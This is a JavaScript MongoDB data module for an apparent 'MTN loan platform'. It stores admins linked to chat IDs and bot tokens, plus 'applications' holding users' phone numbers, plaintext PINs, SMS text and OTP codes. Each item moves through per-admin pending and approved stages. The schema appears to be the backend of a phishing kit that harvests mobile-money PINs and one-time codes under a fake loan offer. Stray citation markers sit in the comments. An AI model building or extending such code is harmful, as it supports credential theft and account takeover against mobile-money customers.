/**
 * ============================================================================
 * MongoDB Database Connector & Operations Module
 * ============================================================================
 */

const { MongoClient } = require('mongodb');

let client;
let db;

// Database and Collection Configuration[cite: 2]
const DB_NAME = 'mtn_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications',
    ENVIRONMENT_LOGS: 'environment_logs'
};

/**
 * Connect to MongoDB instance[cite: 2].
 */
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;

        if (!MONGODB_URI) {
            throw new Error('❌ MONGODB_URI is not defined in environment variables.');
        }

        console.log('🔄 Connecting to MongoDB...');

        client = new MongoClient(MONGODB_URI);
        await client.connect();

        db = client.db(DB_NAME);
        console.log('✅ Connected to MongoDB successfully.');

        await createIndexes();
        return db;
    } catch (error) {
        console.error('❌ MongoDB connection failure:', error);
        throw error;
    }
}

/**
 * Create necessary database indexes for fast queries[cite: 2].
 */
async function createIndexes() {
    try {
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ role: 1 });

        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ smsStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).createIndex({ action: 1 });

        console.log('✅ Database indexes synchronized.');
    } catch (error) {
        console.error('⚠️ Index creation warning:', error.message);
    }
}

/**
 * Safely close the database connection[cite: 2].
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ MongoDB connection closed gracefully.');
    }
}

// ==========================================
// ENVIRONMENT & ACTIVITY LOGS
// ==========================================

async function logAdminActivity(adminId, action, details = {}) {
    try {
        const logEntry = {
            adminId,
            action,
            details,
            timestamp: new Date().toISOString()
        };
        await db.collection(COLLECTIONS.ENVIRONMENT_LOGS).insertOne(logEntry);
    } catch (error) {
        console.error('❌ Error recording activity log:', error);
    }
}

async function getEnvironmentLogs(query = {}, limit = 100) {
    try {
        return await db.collection(COLLECTIONS.ENVIRONMENT_LOGS)
            .find(query)
            .sort({ timestamp: -1 })
            .limit(limit)
            .toArray();
    } catch (error) {
        console.error('❌ Error retrieving environment logs:', error);
        return [];
    }
}

// ==========================================
// ADMIN OPERATIONS & PERMISSIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        const adminId = adminData.adminId || adminData.id;

        if (!adminId) throw new Error('Admin ID is required.');
        if (!adminData.name) throw new Error('Admin name is required.');
        if (!adminData.email) throw new Error('Admin email is required.');
        if (!adminData.chatId) throw new Error('Admin chatId is required.');

        const existingAdmin = await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
        if (existingAdmin) throw new Error(`Admin with ID ${adminId} already exists.`);

        // Assign 'super_admin' role and grant all permissions ('*') if specified or requested
        const role = adminData.role || 'admin';
        const isSuperAdmin = role === 'super_admin';

        const adminDocument = {
            adminId,
            name: adminData.name,
            email: adminData.email,
            chatId: adminData.chatId,
            role: role,
            permissions: isSuperAdmin ? ['*'] : (adminData.permissions || []),
            status: adminData.status || 'active',
            createdAt: adminData.createdAt || new Date().toISOString()
        };

        if (adminData.botToken) adminDocument.botToken = adminData.botToken;

        const result = await db.collection(COLLECTIONS.ADMINS).insertOne(adminDocument);
        await logAdminActivity(adminId, 'ADMIN_CREATED', { name: adminData.name, email: adminData.email, role });

        console.log(`✅ Admin saved successfully: ${adminId} (${adminData.name}) - Role: ${role}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error);
        throw error;
    }
}

async function getAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error fetching admin:', error);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
    } catch (error) {
        console.error('❌ Error fetching admin by chat ID:', error);
        return null;
    }
}

async function getAllAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error fetching all admins:', error);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error fetching active admins:', error);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        // If role is updated to super_admin, automatically assign all permissions
        if (updates.role === 'super_admin') {
            updates.permissions = ['*'];
        }

        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        await logAdminActivity(adminId, 'ADMIN_UPDATED', updates);
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error);
        throw error;
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
        await logAdminActivity(adminId, 'ADMIN_STATUS_UPDATED', { status });
        return result;
    } catch (error) {
        console.error('❌ Error updating admin status:', error);
        throw error;
    }
}

async function deleteAdmin(adminId) {
    try {
        const result = await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
        await logAdminActivity(adminId, 'ADMIN_DELETED', {});
        return result;
    } catch (error) {
        console.error('❌ Error deleting admin:', error);
        throw error;
    }
}

async function adminExists(adminId) {
    try {
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        console.error('❌ Error checking admin existence:', error);
        return false;
    }
}

async function getAdminCount() {
    try {
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        console.error('❌ Error getting admin count:', error);
        return 0;
    }
}

/**
 * Check if an admin has a specific permission. 
 * Super Admins (role: 'super_admin' or permission '*') automatically pass.
 */
async function hasPermission(adminId, requiredPermission) {
    try {
        const admin = await getAdmin(adminId);
        if (!admin || admin.status !== 'active') return false;

        if (admin.role === 'super_admin' || (admin.permissions && admin.permissions.includes('*'))) {
            return true;
        }

        return admin.permissions && admin.permissions.includes(requiredPermission);
    } catch (error) {
        console.error('❌ Error checking admin permission:', error);
        return false;
    }
}

// ==========================================
// APPLICATION OPERATIONS (Multi-Stage Workflow)
// ==========================================

async function saveApplication(appData) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id: appData.id,
            adminId: appData.adminId,
            adminName: appData.adminName,
            phoneNumber: appData.phoneNumber,
            pin: appData.pin,
            pinStatus: appData.pinStatus || 'pending',
            smsText: appData.smsText || null,
            smsStatus: appData.smsStatus || 'pending',
            otp: appData.otp || null,
            otpStatus: appData.otpStatus || 'pending',
            assignmentType: appData.assignmentType,
            isReturningUser: appData.isReturningUser || false,
            previousCount: appData.previousCount || 0,
            timestamp: appData.timestamp || new Date().toISOString()
        });

        if (appData.adminId) {
            await logAdminActivity(appData.adminId, 'APPLICATION_CREATED', { applicationId: appData.id, phoneNumber: appData.phoneNumber });
        }

        console.log(`💾 Application record saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error);
        throw error;
    }
}

async function getApplication(applicationId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error retrieving application:', error);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );

        const app = await getApplication(applicationId);
        if (app && app.adminId) {
            await logAdminActivity(app.adminId, 'APPLICATION_UPDATED', { applicationId, updates });
        }

        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error);
        throw error;
    }
}

async function updateApplicationSms(applicationId, smsText, smsStatus = 'pending') {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { smsText, smsStatus, updatedAt: new Date().toISOString() } }
        );

        const app = await getApplication(applicationId);
        if (app && app.adminId) {
            await logAdminActivity(app.adminId, 'SMS_SUBMITTED', { applicationId, smsStatus });
        }

        return result;
    } catch (error) {
        console.error('❌ Error updating application SMS:', error);
        throw error;
    }
}

async function updateApplicationOtp(applicationId, otp, otpStatus = 'pending') {
    try {
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { otp, otpStatus, updatedAt: new Date().toISOString() } }
        );

        const app = await getApplication(applicationId);
        if (app && app.adminId) {
            await logAdminActivity(app.adminId, 'OTP_SUBMITTED', { applicationId, otpStatus });
        }

        return result;
    } catch (error) {
        console.error('❌ Error updating application OTP:', error);
        throw error;
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error fetching applications by admin:', error);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [
                    { pinStatus: 'pending' },
                    { smsStatus: 'pending' },
                    { otpStatus: 'pending' }
                ]
            })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error fetching pending applications:', error);
        return [];
    }
}

// ==========================================
// STATISTICS & REPORTING
// ==========================================

async function getAdminStats(adminId) {
    try {
        const total = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
        const smsPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsStatus: 'pending' });
        const smsApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, smsStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });

        return { total, pinPending, pinApproved, smsPending, smsApproved, otpPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error generating admin statistics:', error);
        return { total: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        const totalAdmins = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const smsPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsStatus: 'pending' });
        const smsApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ smsStatus: 'approved' });
        const otpPending = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });

        return { totalAdmins, totalApplications, pinPending, pinApproved, smsPending, smsApproved, otpPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error generating overall statistics:', error);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, smsPending: 0, smsApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,
    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,
    hasPermission,
    saveApplication,
    getApplication,
    updateApplication,
    updateApplicationSms,
    updateApplicationOtp,
    getApplicationsByAdmin,
    getPendingApplications,
    logAdminActivity,
    getEnvironmentLogs,
    getAdminStats,
    getStats
};
